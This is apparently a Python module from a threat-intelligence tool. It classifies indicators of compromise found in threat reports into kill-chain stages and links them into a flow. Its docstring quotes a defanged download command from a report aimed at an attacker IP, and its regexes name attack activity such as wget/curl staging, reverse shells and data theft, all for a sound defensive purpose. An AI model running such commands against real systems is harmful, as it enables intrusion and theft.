"""
IOC flow: a report's indicators in the order an intrusion uses them.

Reports rarely say "this IP led to that hash" outright, so the flow is inferred from
where the report mentions each indicator:
  stage  the sentence (or IOC-table row) around an indicator says what it was for:
         "wget hxxp://172.233.228[.]93/patch" is staging, "C2 server" is C2
  link   indicators mentioned in the same sentence or command are linked, earlier
         stage to later: the server the payload was pulled from -> the payload
Every node keeps the sentences it was inferred from, shown as its evidence.
"""

import json
import os
import re
from typing import Dict, List, Optional

from archer.config import DATA_DIR

IOC_FLOWS_DIR = os.path.join(DATA_DIR, "ioc_flows")

# Kill-chain order; an indicator's stage comes from the first that its evidence matches
STAGES = [
    ("exploitation", "Exploitation / access", r"exploit|scann?(ing|ed|er)|prob(e|ing)|attempt|initial access|phish|brute|source ip|vulnerab|login from"),
    ("staging", "Staging / download", r"download|wget|curl|fetch|retriev|hosted|host(s|ing) the|staging|dropper|deliver|pull(ed|s)? (down|from)"),
    ("payload", "Payload / execution", r"payload|backdoor|malware|implant|web ?shell|binary|executable|script|loader|ransomware|trojan|stealer|tool"),
    ("persistence", "Persistence", r"persist|cron|systemd|scheduled task|startup|autorun|run key|service install"),
    ("c2", "Command and control", r"\bc2\b|command[- ]and[- ]control|beacon|callback|call(s|ed)? back|reverse shell|connect(s|ed|ion)? (to|back)|communicat|tunnel"),
    ("exfiltration", "Exfiltration", r"exfil|upload(ed|s)? (to|data)|steal|harvest|collect(ed)? data|leak"),
]
OTHER = ("infrastructure", "Infrastructure (role not stated)")
_ORDER = [s[0] for s in STAGES] + [OTHER[0]]
_LABEL = {**{k: label for k, label, _ in STAGES}, OTHER[0]: OTHER[1]}
_PATTERN = {k: re.compile(rx, re.I) for k, _, rx in STAGES}

_FANG = re.compile(r"\s*(?:\[\.\]|\(\.\)|\[dot\]|\(dot\))\s*", re.I)
_SENTENCE = re.compile(r"(?<=[.!?])\s+(?=[A-Z])|\n+")
MAX_EVIDENCE = 3
MAX_EVIDENCE_CHARS = 280
# A sentence naming more indicators than this is a list, table or hunting query: it says
# nothing about what any one of them did, and linking all of them would be noise
MAX_IOCS_PER_SENTENCE = 3


def refang(text: str) -> str:
    text = _FANG.sub(".", text or "")
    return re.sub(r"\bhxxp", "http", text, flags=re.I).replace("[:]", ":")


def ioc_mentions(text: str, iocs: Dict[str, List[str]]) -> Dict[str, List[str]]:
    """{refanged lowercase indicator: up to 3 sentences of the text that mention it}."""
    values = {refang(str(v)).strip().lower() for vs in (iocs or {}).values() for v in vs or [] if v}
    values = {v for v in values if len(v) >= 4}
    if not values or not text:
        return {}
    out: Dict[str, List[str]] = {}
    for sentence in _SENTENCE.split(refang(text)):
        sentence = " ".join(sentence.split())
        low = sentence.lower()
        found = [v for v in values if v in low]
        if not found or len(found) > MAX_IOCS_PER_SENTENCE:
            continue
        for v in found:
            # An IOC-table cell holding just the indicator is not context
            if not re.search(r"[a-z]{3,}", low.replace(v, "")):
                continue
            if len(out.setdefault(v, [])) < MAX_EVIDENCE:
                if len(sentence) > MAX_EVIDENCE_CHARS:  # keep the part around the indicator
                    i = low.index(v)
                    start = max(0, i - MAX_EVIDENCE_CHARS // 2)
                    sentence = ("…" if start else "") + sentence[start:start + MAX_EVIDENCE_CHARS] + "…"
                if sentence not in out[v]:
                    out[v].append(sentence)
    return {k: v for k, v in out.items() if v}


def merge_mentions(*many: Optional[Dict[str, List[str]]]) -> Dict[str, List[str]]:
    out: Dict[str, List[str]] = {}
    for m in many:
        for k, sentences in (m or {}).items():
            bucket = out.setdefault(k, [])
            bucket.extend(s for s in sentences if s not in bucket and len(bucket) < MAX_EVIDENCE)
    return out


def _sentence_stage(value: str, sentence: str) -> Optional[str]:
    """The stage whose keyword sits nearest the indicator in this sentence."""
    low = sentence.lower()
    at = low.find(value.lower())
    best, best_dist = None, None
    for key, _, _ in STAGES:
        if key == "payload":  # what a server hosts, not what the server is
            continue
        for m in _PATTERN[key].finditer(sentence):
            dist = abs(m.start() - at)
            if best_dist is None or dist < best_dist:
                best, best_dist = key, dist
    return best


def _stage(kind: str, value: str, evidence: List[str]) -> str:
    """
    The stage most of the indicator's sentences point to (ties: earlier stage).
    One "attempts" doesn't make a server that three sentences say "hosted" the
    payload an exploitation source; in "an exploit attempt ... hosting the backdoor
    at X", hosting is the word about X.
    """
    if kind in ("sha256", "sha1", "md5", "file"):
        # A hash names a file: it is the payload unless the report says it persists
        text = " ".join(evidence)
        return "persistence" if _PATTERN["persistence"].search(text) else "payload"
    votes: Dict[str, int] = {}
    for s in evidence:
        key = _sentence_stage(value, s)
        if key:
            votes[key] = votes.get(key, 0) + 1
    if not votes:
        return OTHER[0]
    best = max(votes.values())
    return next(k for k in _ORDER if votes.get(k) == best)


def build_ioc_flow(clean_iocs: Dict[str, List[str]], mentions: Optional[Dict[str, List[str]]] = None,
                   source: str = "") -> Dict:
    """
    The flow for a run's cleaned IOCs (ioc_sweep.clean_report_iocs). Empty dict when
    there are no IOCs, so callers can skip the diagram.
    """
    mentions = mentions or {}
    nodes = []
    for kind, values in (clean_iocs or {}).items():
        if kind == "domain_pattern":  # a regex, not an indicator to place
            continue
        for value in values:
            evidence = mentions.get(value.lower(), [])
            nodes.append({"id": f"n{len(nodes)}", "value": value, "kind": kind,
                          "stage": _stage(kind, value, evidence), "evidence": evidence})
    if not nodes:
        return {}

    rank = {k: i for i, k in enumerate(_ORDER)}
    edges, seen = [], set()
    by_sentence: Dict[str, List[dict]] = {}
    for n in nodes:
        for s in n["evidence"]:
            by_sentence.setdefault(s, []).append(n)
    for sentence, group in by_sentence.items():
        low = sentence.lower()
        # Text order within the sentence, then stage order across it
        group = sorted(group, key=lambda n: low.find(n["value"].lower()))
        for a in group:
            for b in group:
                if a is b or rank[a["stage"]] >= rank[b["stage"]] or b["stage"] == OTHER[0]:
                    continue
                if (a["id"], b["id"]) not in seen:
                    seen.add((a["id"], b["id"]))
                    edges.append({"from": a["id"], "to": b["id"], "evidence": sentence})

    stages = [{"key": k, "label": _LABEL[k], "nodes": [n for n in nodes if n["stage"] == k]} for k in _ORDER]
    stages = [s for s in stages if s["nodes"]]
    return {
        "source": source,
        "stages": stages,
        "edges": edges,
        "stats": {"iocs": len(nodes), "stages": len(stages), "links": len(edges),
                  "with_evidence": sum(1 for n in nodes if n["evidence"])},
    }


def _path(group_name: str) -> str:
    return os.path.join(IOC_FLOWS_DIR, re.sub(r"[^A-Za-z0-9]+", "", group_name) + ".json")


def save_ioc_flow(group_name: str, flow: Dict) -> None:
    if not flow:
        return
    os.makedirs(IOC_FLOWS_DIR, exist_ok=True)
    with open(_path(group_name), "w", encoding="utf-8") as fh:
        json.dump(flow, fh, indent=1)


def load_ioc_flow(group_name: str) -> Dict:
    try:
        with open(_path(group_name), encoding="utf-8") as fh:
            flow = json.load(fh)
        return flow if flow.get("stages") else {}
    except (OSError, ValueError):
        return {}
